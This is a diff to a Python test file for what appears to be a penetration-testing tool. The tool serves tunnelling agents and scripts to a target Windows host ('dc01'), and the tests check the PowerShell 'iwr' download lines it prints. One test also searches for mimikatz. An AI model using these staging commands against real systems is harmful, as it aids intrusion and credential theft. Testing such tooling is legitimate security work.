@@ -261,11 +261,12 @@ def test_serve_without_a_tunnel_asks_for_an_address(session, system):
     assert system.spawned == []
 
 
-def test_serve_starts_on_the_tunnel_and_lists_the_download_lines(session, tunnel):
+def test_serve_starts_on_the_tunnel_and_says_how_many_files_without_listing_them(session, tunnel):
     port = free_port()
     upload = session.paths.upload / "ligolo-ng"
     upload.mkdir(parents=True)
     (upload / "agent.exe").write_bytes(b"MZ")
+    (upload / "agent").write_bytes(b"ELF")
     dispatch(session, f"serve tun0 {port}")
     folder = session.box.path / "targets" / "dc01" / "upload"
     assert folder.is_dir()
@@ -273,9 +274,47 @@ def test_serve_starts_on_the_tunnel_and_lists_the_download_lines(session, tunnel
     assert serving.MODULE in argv and str(folder) in argv and str(session.paths.upload) in argv
     assert lines(session, "fail") == []
     assert lines(session, "ok") == [f"serving dc01's upload folder and the tools' files on http://127.0.0.1:{port}/{SECRET}/"]
-    # the box is a Windows one
+    assert lines(session, "detail") == []
+    assert lines(session, "info") == [
+        "2 files; serve files shows the download lines",
+        "serve log shows who fetched what; serve stop ends it",
+    ]
+
+
+def test_serve_files_shows_the_download_lines(session, tunnel):
+    port = free_port()
+    upload = session.paths.upload / "ligolo-ng"
+    upload.mkdir(parents=True)
+    (upload / "agent.exe").write_bytes(b"MZ")
+    dispatch(session, f"serve tun0 {port}")
+    (session.box.path / "targets" / "dc01" / "upload" / "run.ps1").write_text("hi")
+    session.console = FakeConsole()
+    dispatch(session, "serve files")
+    # the box is a Windows one; a file put in after the start is listed too
+    assert session.console.lines == [
+        ("detail", f"iwr http://127.0.0.1:{port}/{SECRET}/run.ps1 -OutFile run.ps1"),
+        ("detail", f"iwr http://127.0.0.1:{port}/{SECRET}/ligolo-ng/agent.exe -OutFile agent.exe"),
+    ]
+
+
+def test_serve_files_with_a_word_shows_only_the_files_it_matches(session, tunnel):
+    port = free_port()
+    upload = session.paths.upload / "ligolo-ng"
+    upload.mkdir(parents=True)
+    (upload / "agent.exe").write_bytes(b"MZ")
+    dispatch(session, f"serve tun0 {port}")
+    (session.box.path / "targets" / "dc01" / "upload" / "run.ps1").write_text("hi")
+    session.console = FakeConsole()
+    dispatch(session, "serve files AGENT")
     assert lines(session, "detail") == [f"iwr http://127.0.0.1:{port}/{SECRET}/ligolo-ng/agent.exe -OutFile agent.exe"]
-    assert lines(session, "info")[-1] == "serve log shows who fetched what; serve stop ends it"
+    session.console = FakeConsole()
+    dispatch(session, "serve files mimikatz")
+    assert lines(session) == ["no file served matches mimikatz"]
+
+
+def test_serve_files_with_nothing_served(session):
+    dispatch(session, "serve files")
+    assert lines(session, "fail") == ["nothing is being served; start it with serve"]
 
 
 def test_serve_with_no_files_says_where_to_put_them(session, tunnel):
